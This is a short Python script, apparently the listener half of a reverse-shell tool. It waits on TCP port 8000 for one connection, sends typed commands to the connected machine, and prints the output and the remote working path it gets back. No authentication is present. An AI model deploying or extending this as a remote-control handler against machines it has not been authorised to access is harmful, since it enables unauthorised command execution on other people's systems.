import socket

sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

sock.bind(("",8000))

sock.listen()

c, addr = sock.accept()
c.settimeout(3)
masir = ""
while True:
    if masir == "" :
      masir = "start"
    else:
        pass
    command = input(masir+" >> ")
    if command == "exit":
        c.send(b"exit")
        sock.close()
        break
    c.send(command.encode())

    try:
        data = c.recv(99999).decode()
        masir = c.recv(99999).decode()
 
        print(data)
    except:
        pass